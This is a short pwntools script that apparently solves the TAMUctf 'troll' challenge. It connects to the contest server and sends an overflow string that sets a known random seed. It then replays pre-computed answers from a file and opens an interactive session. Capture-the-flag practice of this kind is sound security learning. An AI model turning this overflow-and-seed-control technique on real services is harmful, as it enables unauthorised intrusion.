from pwn import *
#p=process("./troll")
p=remote("challenges.tamuctf.com",4765)
p.recvuntil("Who goes there?")
SEED="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP1000"
p.sendline(SEED)
log.info("Sent First payload")
answers=open("answer","r")
for line in answers:
	p.recvuntil("What is it?")
	log.info("sending answer: "+line)
	p.sendline(line)	
p.interactive()
